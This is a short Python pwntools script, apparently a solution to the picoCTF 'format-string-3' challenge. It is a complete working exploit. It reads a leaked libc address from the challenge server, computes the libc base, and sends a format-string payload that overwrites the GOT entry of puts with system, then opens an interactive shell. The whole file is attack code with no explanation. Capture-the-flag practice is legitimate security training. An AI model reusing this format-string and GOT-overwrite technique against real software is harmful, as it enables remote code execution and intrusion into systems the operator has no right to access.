from pwn import *

binary = ELF("format-string-3")
context.binary = binary
libc = ELF("libc.so.6")
def exec_fmt(payload):
    p = remote("rhea.picoctf.net",60329)
    p.sendline(payload)
    return p.recvall()
'''
fmtstr = FmtStr(exec_fmt)
offset = fmtstr.offset
print(offset)
'''
offset = 38
conn = remote("rhea.picoctf.net",60329)
conn.recvline()
recieved = conn.recvline().decode()
setvbuf_address = libc.symbols["setvbuf"]
setvbuf_address_here = int(recieved[recieved.find("libc: ") + len("libc: ") + 2:-1],16)
libc.address = setvbuf_address_here - setvbuf_address
#print(recieved[recieved.find("libc: ") + len("libc: ") + 2:-1],recieved)
#print(setvbuf_address, setvbuf_address_here)
putsaddr = libc.symbols["puts"]
address_system = libc.symbols["system"]
payload = fmtstr_payload(offset, {binary.got["puts"]: address_system})
conn.sendline(payload)
conn.interactive()
